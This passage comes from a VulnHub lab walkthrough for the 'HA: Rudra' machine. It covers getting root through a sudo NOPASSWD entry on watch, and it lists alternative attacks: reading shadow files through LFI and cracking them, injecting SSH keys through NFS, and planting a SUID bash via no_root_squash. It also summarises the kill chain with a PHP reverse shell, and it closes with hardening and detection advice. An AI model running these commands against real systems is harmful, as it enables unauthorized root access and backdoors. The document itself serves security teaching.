This is the **first command you should run as any new user**:

```bash
mahakaal@rudra:~$ sudo -l
```

```text
Matching Defaults entries for mahakaal on rudra:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mahakaal may run the following commands on rudra:
    (ALL) NOPASSWD: /usr/bin/watch
```

> **Parse this line precisely — it tells you everything:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | May run as **any user**, including root |
> | `NOPASSWD:` | **No password will be requested** |
> | `/usr/bin/watch` | Only this one binary — but an *absolute path*, so it must be exactly this file |
>
> **Why is `watch` dangerous?** `watch` repeatedly runs a command and displays
> its output. It has a `-x` flag meaning *"execute the rest of the arguments
> directly instead of passing them to `sh -c`"*. Because `watch` is being run by
> `sudo` **as root**, the command it executes also runs as root.
>
> So: *a program whose entire purpose is to run other programs, granted to a
> non-root user with no password, is root.* This is the `sudo` misconfiguration
> pattern in its purest form.

### 8.2 Check GTFOBins

Never invent the payload — look it up. <https://gtfobins.github.io/gtfobins/watch/>
documents the **interactive shell** recipe:

```bash
sudo watch -x sh -c 'reset; exec sh'
```

### 8.3 Execute

```bash
mahakaal@rudra:~$ sudo watch -x sh -c 'reset; exec sh'
```

```text
#
```

The prompt changed from `mahakaal@rudra:~$` to a bare `#`. Confirm:

```sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# hostname
rudra
```

> **What just happened, step by step:**
> 1. `sudo watch …` starts `watch` as **root**.
> 2. `-x sh -c '...'` tells `watch` to `execvp` its remaining arguments directly
>    — so it runs `sh -c 'reset; exec sh'` **inheriting root's UID**.
> 3. `reset` reinitialises the terminal (`watch` leaves it in a strange state, and
>    without this your shell will be unreadable).
> 4. `exec sh` **replaces** the shell process with a fresh interactive `sh`.
>    `exec` matters: it does not fork, so the shell is a direct child of the
>    root-owned `watch`, and job control works.

### 8.4 The root flag

```sh
# cd /root && ls -la
total 32
drwx------  4 root root 4096 Oct 22  2019 .
drwxr-xr-x 23 root root 4096 Oct 22  2019 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  168 Oct 22  2019 flag.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Oct 22  2019 .ssh
# cat flag.txt
```

```text
   __  __       _   _
  |  \/  | __ _| |_| |__  _ __ __ _
  | |\/| |/ _` | __| '_ \| '__/ _` |
  | |  | | (_| | |_| | | | | | (_| |
  |_|  |_|\__,_|\__|_| |_|_|  \__,_|

   Har Har Mahadev! You are a true Bhole Bhakt.

   flag{M4h4k44l_Bl3ss3d_Y0u}

              — Hacking Articles
```

**Root flag captured.** ✅

![Root shell and flag.txt](images/08-root-flag.png)

### 8.5 Clean up

```sh
# umount /tmp/ignite                       # on Kali, after exiting
# rm -f /home/shivay/shell.php /home/shivay/pwd
# restore /var/www/html/nandi.php from backup
```

Leaving a PHP reverse shell and a modified NFS export behind would be a serious
finding in a real engagement — and would break the VM for the next student.

---

## 9. Alternative paths

The author states there are *"multiple methods to solve this machine"*.

### 9.1 Read `/etc/shadow` and crack it

You have an LFI, and `/etc/shadow` is mode `640 root:shadow`. `www-data` is not
in the `shadow` group, so **this fails** — but on boxes where it succeeds:

```bash
curl -s "http://192.168.56.111/nandi.php?file=/etc/shadow"
```

```text
Warning: include(/etc/shadow): failed to open stream: Permission denied in /var/www/html/nandi.php on line 7
```

If it *had* worked, you would `unshadow` and run John:

```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
```

### 9.2 LFI → SSH key injection

If `mahakaal`'s `.ssh` directory were inside the NFS export you could write an
`authorized_keys` file and log straight in — no password, no Cloakify. Here
`/home/shivay/.ssh` does not exist, but the technique generalises:

```bash
ssh-keygen -t ed25519 -f rudra_key -N ''
cat rudra_key.pub > /tmp/ignite/.ssh/authorized_keys   # only if .ssh is in the export
chmod 600 /tmp/ignite/.ssh/authorized_keys
ssh -i rudra_key shivay@192.168.56.111
```

> **This is the most dangerous consequence of a writable NFS export of a home
> directory.** An attacker does not need any credential at all — they just write
> their own public key.

### 9.3 `no_root_squash` → direct root, no LFI at all

Because the export uses **`no_root_squash`**, root on Kali can write files that
are owned by **root on the target**. So you can simply overwrite a root-owned
file that gets executed:

```bash
# Kali (as root, with the export mounted at /tmp/ignite)
sudo cp /home/shivay/.bashrc /tmp/ignite/.bashrc.bak
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' | sudo tee -a /tmp/ignite/.bashrc
```

Then get `shivay` to log in (via the Cloakify chain or any other means) and run
`/tmp/rootbash -p`. This is slower than the intended path but demonstrates why
`no_root_squash` is on every hardening blacklist.

### 9.4 Kernel exploits

```sh
# uname -a
Linux rudra 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Kernel `4.15.0-66` on Ubuntu 18.04 is old enough that Dirty COW variants and
later `overlayfs`/`io_uring` bugs may apply. `searchsploit ubuntu 18.04` and
check <https://www.linuxkernelcves.com/>. Use this only if the intended path is
blocked — kernel exploits can panic the VM.

---

## 10. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
| --- | --- | --- | --- | --- |
| 1 | **NFS export open to the world** | `/etc/exports`: `/home/shivay *(rw,sync,…)` | Unauthenticated **read and write** to a user's home directory | Restrict the client list to specific hosts/IPs; never use `*` |
| 2 | **`no_root_squash`** | `/etc/exports` | Client root is honoured as target root — write any root-owned file | Use the default `root_squash` (or stronger, `all_squash` + `anonuid`) |
| 3 | **Local File Inclusion** | `/var/www/html/nandi.php`, `include($_GET['file'])` | Arbitrary file read → combined with NFS becomes **RCE** | Allow-list valid values; use `basename()`; never pass raw input to `include()` |
| 4 | **`robots.txt` advertising a private path** | `/robots.txt` → `Disallow: /nandi.php` | Hands the attacker the vulnerable endpoint | Do not rely on `robots.txt` for confidentiality; remove unused scripts |
| 5 | **PHP error display enabled** | `display_errors=On` | Leaks absolute paths and `include_path` | `display_errors=Off`, `log_errors=On` in production |
| 6 | **MySQL root with empty password** | `127.0.0.1:3306` | Any local process (incl. `www-data`) reads every database | Set a strong root password; use `mysql_native_password` per-app accounts with least privilege |
| 7 | **Hints stored in a database table** | `mahadev.hint` | Guides the attacker to the next stage | Not a real-world flaw, but illustrates DB compromise = full data disclosure |
| 8 | **Cloakify emoji file readable by `www-data`** | `/media/pwd`, mode `644` root | Credential disclosure once any web RCE exists | Store secrets in a vault (Vault, SOPS, Secrets Manager), mode `600`, root-only |
| 9 | **`sudo` NOPASSWD on `watch`** | `/etc/sudoers` | **Direct root** — `sudo watch -x sh -c 'reset; exec sh'` | Remove the entry. `watch` executes arbitrary commands and must never be in sudoers |
| 10 | **SSH reachable with a guessable cultural password** | `mahakaal:kalbhairav` | Lateral movement | Enforce key-only auth (`PasswordAuthentication no`), check passwords against breach lists |

### The kill chain in one line

```text
nmap -A -p- → 22 ssh, 80 http, 111 rpcbind, 2049 nfs
  → nmap --script=nfs-showmount → /home/shivay *   (exported to everyone)
  → curl /robots.txt → Disallow: /nandi.php
  → curl "/nandi.php" → "include(): Filename cannot be empty"  <=== LFI
  → ?file=/etc/passwd → users rudra, shivay, mahakaal
  → php://filter/convert.base64-encode/resource=nandi.php → include($_GET['file'])
  → /etc/exports via LFI → rw,no_root_squash
  → showmount -e; mount -t nfs IP:/home/shivay /tmp/ignite → mahadev.txt
  → cp php-reverse-shell.php /tmp/ignite/shell.php   (writes to the TARGET)
  → nc -lvnp 4444 ; curl "/nandi.php?file=/home/shivay/shell.php" → www-data
  → ss -tulnp → 127.0.0.1:3306 mysqld
  → mysql -u root (no password) → mahadev.hint → "check in media filesystem"
  → cat /media/pwd → 8 distinct emoji, 30 symbols → Cloakify
  → cloakifyFactory.py → 2 (decloakify) → /root/pwd → /root/decodedpwd → no noise → cipher 3 = emoji
  → mahakaal:kalbhairav
  → ssh mahakaal@IP
  → sudo -l → (ALL) NOPASSWD: /usr/bin/watch
  → sudo watch -x sh -c 'reset; exec sh' → uid=0(root)
  → cat /root/flag.txt
```

---

## 11. Defensive lessons (blue team)

### NFS hardening — the primary lesson

1. **Never export with `*`.** Always name the clients:

   ```text
   # BAD
   /home/shivay  *(rw,sync,no_subtree_check,no_root_squash)

   # GOOD
   /home/shivay  192.168.56.20(rw,sync,no_subtree_check,root_squash)
   ```

2. **Never use `no_root_squash`.** It converts "member of the `lxd`/`docker`
   group" style escalation into "any root on any permitted client owns your
   files". If you need anonymous mapping, prefer `all_squash,anonuid=1001`.
3. **Do not export home directories at all.** Export a dedicated
   `/srv/share/data` with the *minimum* permission set.
4. **Mount read-only (`ro`) unless you need writes.** Most NFS use cases are
   distribution, not collaboration.
5. **Audit what is exported, continuously:**

   ```bash
   showmount -e localhost
   cat /etc/exports
   exportfs -v
   rpcinfo -p localhost
   ```

   And from the network side — run `nmap --script=nfs-showmount` against your own
   subnets monthly. An NFS export you forgot about is a standing data breach.
6. **Prefer NFSv4 with Kerberos (`sec=krb5p`)** instead of IP-based trust, which
   is trivially spoofed on a flat network.

### Web application hardening

7. **Validate include targets with an allow-list**, not a deny-list:

   ```php
   $pages = ['home' => 'pages/home.php', 'about' => 'pages/about.php'];
   $key   = $_GET['file'] ?? 'home';
   if (!array_key_exists($key, $pages)) { http_response_code(400); exit; }
   include $pages[$key];
   ```

   A deny-list (`str_replace('../','')`) is always bypassable — `....//`,
   `%2e%2e%2f`, absolute paths, null bytes on old PHP.
8. **Turn off `display_errors`.** The `include()` warning in §2.3 gave away both
   the vulnerability *and* the absolute path. In production:
   `display_errors=Off`, `log_errors=On`, `error_log=/var/log/php/error.log`.
9. **Delete `robots.txt` entries that name private scripts** — or better, delete
   the scripts. `Disallow:` is a *request*, not a control.
10. **Run your own content discovery.** `gobuster dir -u https://prod.example.com
    -w big.txt -x php,txt,bak,zip` once a month. If you can find it, so can an
    attacker.

### Local hardening

11. **No empty database passwords. Ever.** `mysql -u root` returning a prompt-less
    login as `www-data` means every web compromise becomes a full data breach.
    Use `mysql_secure_installation` on every deploy.
12. **Secrets must not sit in world-readable files.** `/media/pwd` was `644`.
    Encoding it as emoji does **not** make it secret — Cloakify is a *public*
    tool with a *public* cipher list. Obscurity through an open-source encoder is
    still obscurity, not security. Use a secrets manager, or at minimum
    `chmod 600` plus a dedicated owner.
13. **Audit `sudo -l` for every account:**

    ```bash
    for u in $(cut -d: -f1 /etc/passwd); do sudo -l -U "$u" 2>/dev/null; done | grep -i nopasswd
    ```

    Cross-reference every result against **GTFOBins**. Binaries that can execute
    other programs (`watch`, `find`, `less`, `more`, `vim`, `python`, `perl`,
    `awk`, `env`, `ftp`, `gdb`, `man`, `nmap`, `tar`, `zip`, `make`, `git`) must
    never appear with `NOPASSWD`.
14. **Detect the chain.** High-value alerts for this box:
    - `nfsd` connections from unexpected client IPs.
    - Apache child (`www-data`) spawning `/bin/sh` or `/bin/bash` — the single
      loudest indicator of a web shell.
    - `mysqld` client connections originating from the Apache user.
    - `sudo` invocations of `watch` with `-x`.
    - `sshd` login for an account immediately after a `www-data` shell opened.

---

## 12. References

- VulnHub entry: <https://vulnhub.com/entry/ha-rudra,386/>
- Official walkthrough (Hacking Articles): <https://www.hackingarticles.in/ha-rudra-vulnhub-walkthrough/>
- Anushibin John Joseph, "HA: Rudra — Walkthrough": <https://anushibin.wordpress.com/2019-10-26/ha-rudra%E2%80%8A-%E2%80%8Awalkthrough/>
- Mirror of the official walkthrough: <https://nwpc-ch.org/exploits/ha-rudra-vulnhub-walkthrough>
- Cloakify (TryCatchHCF) — the emoji data-exfiltration tool used here: <https://github.com/TryCatchHCF/Cloakify>
- DEF CON 24 — "Cloakify: Data Exfiltration & Infiltration In Plain Sight": <https://github.com/TryCatchHCF/Cloakify/tree/master/DefCon24Slides>
- GTFOBins — `watch`: <https://gtfobins.github.io/gtfobins/watch/>
- GTFOBins home: <https://gtfobins.github.io/>
- `exports(5)` man page (`root_squash`, `no_subtree_check`): <https://man7.org/linux/man-pages/man5/exports.5.html>
- HackTricks — NFS no_root_squash / misconfiguration: <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe>
- PayloadsAllTheThings — File Inclusion: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>
- PHP wrappers reference: <https://www.php.net/manual/en/wrappers.php.php>
- Repository guides: [`docs/TOOLS.md`](../../docs/TOOLS.md) · [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) · [`docs/BEGINNER-PATH.md`](../../docs/BEGINNER-PATH.md)

---

## 13. Screenshot checklist

Screenshots go in [`images/`](images/) beside this file:

| # | File | Section | What it must show |
| --- | --- | --- | --- |
| 01 | `01-netdiscover.png` | 1 | `netdiscover` with the target IP + MAC |
| 02 | `02-nmap-nfs.png` | 2.1 | `nmap -A -p-` with ports 22/80/111/2049 **and** the `rpcinfo` block; ideally `nfs-showmount` too |
| 03 | `03-lfi-discovery.png` | 2.3 | `robots.txt` contents and the `include(): Filename cannot be empty` warning |
| 04 | `04-nfs-mount.png` | 4.1–4.2 | `showmount -e`, `mount -t nfs`, and `cat mahadev.txt` |
| 05 | `05-shell.png` | 4.4–4.5 | `nc -lvnp 4444` catching the shell, then `id` → `www-data` |
| 06 | `06-mysql-hint.png` | 5.1–5.2 | `ss -tulnp` showing `127.0.0.1:3306`, then `SELECT * FROM hint;` |
| 07 | `07-cloakify.png` | 6.3 | `cloakifyFactory.py` menu with choice `2`, then `cat /root/decodedpwd` |
| 08 | `08-root-flag.png` | 8.3–8.4 | `sudo watch -x sh -c 'reset; exec sh'`, `id`, and `cat /root/flag.txt` |

> **How to capture on Kali:** `flameshot gui` or `gnome-screenshot -a`. Save as
> PNG with the exact filenames above so the inline links resolve.
>
> **Terminal readability:** Cloakify Factory's ASCII banner and the MySQL prompt
> both photograph badly at default font size. Bump your terminal to 12–14 pt
> before capturing.

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
